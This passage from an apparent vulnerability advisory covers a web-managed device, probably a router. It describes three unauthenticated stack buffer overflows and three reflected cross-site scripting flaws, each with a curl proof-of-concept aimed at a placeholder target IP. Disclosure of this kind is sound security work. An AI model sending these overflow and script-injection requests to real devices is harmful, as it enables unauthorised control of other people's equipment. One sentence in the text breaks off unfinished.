are exploitable by remote, unauthenticated attackers. Details are outlined in
the following, including some proof-of-concepts.
 
1. Buffer overflow on "post_login.xml"
    
   Invoking the "post_login.xml" server-side script, attackers can specify a
   "hash" password value that is used to authenticate the user. This hash value
   is eventually processed by the "/usr/sbin/widget" local binary. However, the
   latter copies the user-controlled hash into a statically-allocated buffer,
   allowing attackers to overwrite adjacent memory locations.
 
   As a proof-of-concept, the following URL allows attackers to control the
   return value saved on the stack (the vulnerability is triggered when
   executing "/usr/sbin/widget"):
 
     curl http://<target ip>/post_login.xml?hash=AAA...AAABBBB
 
   The value of the "hash" HTTP GET parameter consists in 292 occurrences of
   the &#039;A&#039; character, followed by four occurrences of character &#039;B&#039;. In our lab
   setup, characters &#039;B&#039; overwrite the saved program counter (%ra).
 
 
2. Buffer overflow on "hedwig.cgi"
 
   Another buffer overflow affects the "hedwig.cgi" CGI script. Unauthenticated
   remote attackers can invoke this CGI with an overly-long cookie value that
   can overflow a program buffer and overwrite the saved program address.
 
   Proof-of-concept:
     curl -b uid=$(perl -e &#039;print "A"x1400;&#039;) -d &#039;test&#039; http://<target ip>/hedwig.cgi
 
 
3. Buffer overflow on "authentication.cgi"
 
   The third buffer overflow vulnerability affects the "authentication.cgi" CGI
   script. This time the issue affects the HTTP POST paramter named
   "password". Again, this vulnerability can be abused to achieve remote code
 
   Proof-of-concept:
     curl -b uid=test -d $(perl -e &#039;print "uid=test&password=asd" . "A"x2024;&#039;) http://<target ip>/authentication.cgi
 
 
4. Cross-site scripting on "bind.php"
 
   Proof-of-concept:
    curl "http://<target ip>/parentalcontrols/bind.php?deviceid=test&#039;\"/><script>alert(1)</script><"
 
 
5. Cross-site scripting on "info.php"
 
   Proof-of-concept:
     curl "http://<target ip>/info.php?RESULT=testme\", msgArray); alert(1); //"
 
 
6. Cross-site scripting on "bsc_sms_send.php"
 
   Proof-of-concept:
     curl "http://<target ip>/bsc_sms_send.php?receiver=testme\"/><script>alert(1);</script><div"
